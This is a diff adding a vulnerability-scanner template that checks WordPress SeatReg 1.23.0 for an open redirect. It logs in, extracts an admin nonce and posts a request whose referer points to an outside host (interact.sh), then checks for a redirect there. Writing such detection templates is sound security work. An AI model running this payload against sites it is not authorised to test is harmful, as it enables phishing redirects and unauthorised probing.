@@ -1,0 +1,50 @@
+id: seatreg-redirect
+
+info:
+  name: WordPress Plugin ‘SeatReg’  - Open Redirect
+  author: Mariam Tariq
+  severity: medium
+  description: |
+    WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.
+  reference:
+    - https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html
+  metadata:
+    verified: true
+    max-request: 3
+  tags: redirect,packetstorm,seatreg,wp-plugin,wp,wordpress,authenticated
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=seatreg-welcome HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /wp-admin/admin-post.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        new-registration-name=test&action=seatreg_create_submit&seatreg-admin-nonce={{seatreg-admin-nonce}}&_wp_http_referer=http://interact.sh&submit=Create+new+registration
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_3 == 302
+          - contains(header_3, 'http://interact.sh')
+        condition: and
+
+    extractors:
+      - type: regex
+        name: seatreg-admin-nonce
+        part: body
+        group: 1
+        regex:
+          - '"seatreg\-admin\-nonce" value="([0-9a-z]+)"'
+        internal: true
+
+# digest: 4b0a00483046022100de2ca36d24ece13aea8be9d0461aba69d091c9229b6a8e619d917f1eb6beca960221009ebfff983b4629eba67907d1fdbb6cfe6fa4458ba3fb171db2b7b637dd1db369:922c64590222798bb761d5b6d8e72950
